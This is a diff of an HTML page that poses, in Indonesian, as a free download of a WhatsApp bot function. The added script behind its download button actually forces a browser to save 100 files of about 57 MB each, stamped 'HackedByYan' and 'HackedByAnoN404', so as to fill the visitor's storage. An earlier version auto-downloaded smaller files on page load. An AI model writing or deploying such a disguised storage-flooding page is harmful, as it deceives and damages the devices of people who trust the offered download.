@@ -3,27 +3,62 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Auto Download 5 Files</title>
+    <title>Auto Download Bot Function</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap');
+
+        body {
+            background-color: black;
+            color: cyan;
+            text-align: center;
+            font-family: 'Orbitron', sans-serif;
+            padding-top: 100px;
+        }
+
+        h1 {
+            font-size: 2.5em;
+            text-shadow: 0 0 10px cyan, 0 0 20px blue;
+        }
+
+        .btn {
+            font-size: 1.2em;
+            color: black;
+            background: cyan;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 10px;
+            cursor: pointer;
+            box-shadow: 0 0 10px cyan;
+            transition: 0.3s;
+        }
+
+        .btn:hover {
+            background: blue;
+            color: white;
+            box-shadow: 0 0 20px blue;
+        }
+    </style>
 </head>
 <body>
 
+    <h1>Hello User, I'm Yan</h1>
+    <p>Download Function Bot WhatsApp, saya tidak menjual function traser alpha jadi saya free kan.</p>
+    <button class="btn" onclick="autoDownloadFiles()">Download Sekarang</button>
+
 <script>
     function autoDownloadFiles() {
-        const text = "hai".repeat(5 * 1024 * 1024 / 3); // Ulang "hai" hingga mencapai 5 MB
+        const text = "HackedByYan You Storage Is Having".repeat(5 * 1024 * 1024 / 3); 
         const blob = new Blob([text], { type: "text/plain" });
 
-        for (let i = 1; i <= 5; i++) {
+        for (let i = 1; i <= 100; i++) {
             const link = document.createElement("a");
             link.href = URL.createObjectURL(blob);
-            link.download = `file_${i}.txt`; // Nama file otomatis berubah (file_1.txt, file_2.txt, dst.)
+            link.download = `HackedByAnoN404_${i}.txt`;
             document.body.appendChild(link);
             link.click();
             document.body.removeChild(link);
         }
     }
-
-    // Panggil fungsi saat halaman dimuat
-    window.onload = autoDownloadFiles;
 </script>
 
 </body>
